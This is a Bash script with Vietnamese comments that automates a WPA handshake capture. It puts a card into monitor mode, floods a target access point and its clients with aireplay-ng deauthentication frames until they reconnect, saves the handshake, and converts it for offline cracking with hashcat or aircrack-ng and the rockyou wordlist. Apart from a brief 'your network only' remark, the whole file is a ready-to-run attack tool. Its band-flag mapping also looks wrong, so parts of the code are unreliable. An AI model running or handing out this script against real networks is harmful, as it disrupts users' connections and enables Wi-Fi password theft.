#!/usr/bin/env bash
# Bắt WPA 4-way handshake bằng airodump-ng + deauth ngắn (mạng của bạn).
# Ví dụ:
#   sudo ./handshake.sh wlan0 AA:BB:CC:DD:EE:FF 6
#   sudo ./handshake.sh wlan0 AA:BB:CC:DD:EE:FF 6 11:22:33:44:55:66 60
#   sudo ./handshake.sh wlan0 AA:BB:CC:DD:EE:FF 5 "" 60 6   # 6GHz (band 2.4/5/6)
# Lưu ý: thiết bị bật PMF/802.11w có thể bỏ qua deauth — khi đó chờ client tự kết nối lại.
set -euo pipefail
umask 077

if [[ $EUID -ne 0 ]]; then
  echo "[x] chạy bằng sudo" >&2
  exit 1
fi
IFACE="${1:?usage: sudo ./handshake.sh <iface> <bssid> <channel> [client_mac] [seconds] [band]}"
BSSID="${2:?thiếu BSSID}"
CHANNEL="${3:?thiếu channel}"
CLIENT="${4:-}"
TIMEOUT="${5:-45}"
BAND="${6:-}"

if [[ ! "$BSSID" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
  echo "[x] BSSID không hợp lệ: $BSSID" >&2
  exit 1
fi
if [[ ! "$CHANNEL" =~ ^[0-9]+$ ]]; then
  echo "[x] channel không hợp lệ: $CHANNEL" >&2
  exit 1
fi
if [[ -n "$CLIENT" && ! "$CLIENT" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
  echo "[x] client MAC không hợp lệ: $CLIENT" >&2
  exit 1
fi
if [[ ! "$TIMEOUT" =~ ^[1-9][0-9]*$ ]]; then
  echo "[x] seconds phải là số nguyên dương: $TIMEOUT" >&2
  exit 1
fi
case "$BAND" in
  ""|2.4|5|6) ;;
  *) echo "[x] band không hợp lệ: $BAND (2.4, 5, 6)" >&2; exit 1 ;;
esac

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
OUT_DIR="$ROOT/captures"
mkdir -p "$OUT_DIR"
chmod 700 "$OUT_DIR" 2>/dev/null || true
STAMP="$(date +%Y%m%d-%H%M%S)"
PREFIX="$OUT_DIR/hs-$STAMP"
CAP="$PREFIX-01.cap"

for tool in airodump-ng aireplay-ng aircrack-ng; do
  command -v "$tool" >/dev/null || { echo "[x] thiếu $tool. Kali: apt install aircrack-ng" >&2; exit 1; }
done

monitor_list() {
  iw dev 2>/dev/null | awk '/Interface/ {i=$2} /type monitor/ {print i}'
}

restore_iface() {
  local base="$1"
  local protected="$2"
  local mon
  if ! iw dev "$base" info >/dev/null 2>&1; then
    return 0
  fi
  for mon in $(monitor_list); do
    if [[ "$mon" == "$base" ]]; then
      continue
    fi
    if grep -qx "$mon" <<< "$protected"; then
      continue
    fi
    ip link set "$mon" down 2>/dev/null || true
    iw dev "$mon" del 2>/dev/null || true
  done
  if iw dev "$base" info 2>/dev/null | grep -q 'type monitor'; then
    ip link set "$base" down 2>/dev/null || true
    iw dev "$base" set type managed 2>/dev/null || true
  fi
  ip link set "$base" up 2>/dev/null || true
}

airmon-ng check kill >/dev/null 2>&1 || true

OLD_MON="$(monitor_list)"
MON=""
DUMP_PID=""
cleanup() {
  if [[ -n "$DUMP_PID" ]]; then
    kill "$DUMP_PID" 2>/dev/null || true
    wait "$DUMP_PID" 2>/dev/null || true
  fi
  if [[ -n "$MON" ]]; then
    airmon-ng stop "$MON" >/dev/null 2>&1 || true
  fi
  restore_iface "$IFACE" "$OLD_MON"
}
trap cleanup EXIT

airmon-ng start "$IFACE" >/dev/null 2>&1 || true
MON=""
for candidate in $(monitor_list); do
  if ! grep -qx "$candidate" <<< "$OLD_MON"; then
    MON="$candidate"
    break
  fi
done
if [[ -z "$MON" ]]; then
  if iw dev "$IFACE" info 2>/dev/null | grep -q 'type monitor'; then
    MON="$IFACE"
  else
    echo "[x] không bật được monitor mode trên $IFACE (card/driver không hỗ trợ?)" >&2
    exit 1
  fi
fi

BAND_ARGS=()
case "$BAND" in
  2.4) BAND_ARGS=(--band a) ;;
  5) BAND_ARGS=(--band b) ;;
  6) BAND_ARGS=(--band g) ;;
esac

echo "[*] monitor: $MON | BSSID: $BSSID | kênh: $CHANNEL${BAND:+ (band $BAND)}"
airodump-ng -c "$CHANNEL" --bssid "$BSSID" "${BAND_ARGS[@]}" -w "$PREFIX" --output-format pcap "$MON" >/dev/null 2>&1 &
DUMP_PID=$!

sleep 5

deauth() {
  local count="$1"
  if [[ -n "$CLIENT" ]]; then
    aireplay-ng --deauth "$count" -a "$BSSID" -c "$CLIENT" "$MON" >/dev/null 2>&1 || true
  else
    aireplay-ng --deauth "$count" -a "$BSSID" "$MON" >/dev/null 2>&1 || true
  fi
}

has_handshake() {
  [[ -f "$CAP" ]] || return 1
  (aircrack-ng "$CAP" 2>/dev/null || true) | grep -qi 'handshake'
}

echo "[*] deauth để ép client reconnect (chỉ mạng của bạn)"
deauth 4

for ((i = 0; i < TIMEOUT; i++)); do
  if has_handshake; then
    break
  fi
  sleep 1
  if ((i % 10 == 9)); then
    deauth 2
  fi
done

cleanup
trap - EXIT

if ! has_handshake; then
  echo "[-] chưa bắt được handshake trong ${TIMEOUT}s."
  echo "    Thử: client đang kết nối? kênh đúng? đứng gần AP hơn? chạy lại và chờ lâu hơn."
  exit 1
fi

echo "[+] handshake OK → $CAP"

if command -v hcxpcapngtool >/dev/null; then
  HASH="${CAP%.cap}.hc22000"
  hcxpcapngtool -o "$HASH" "$CAP" | tail -n 30 || true
  if [[ -s "$HASH" ]]; then
    echo "[+] xong. Copy $HASH sang Windows rồi chạy: python crack.py <file.hc22000>"
    exit 0
  fi
fi

echo "[!] convert trên Windows: hcxpcapngtool -o hs.hc22000 \"$CAP\"  (hcxtools win64)"
echo "    Hoặc crack thẳng bằng aircrack-ng: aircrack-ng -w /usr/share/wordlists/rockyou.txt \"$CAP\""
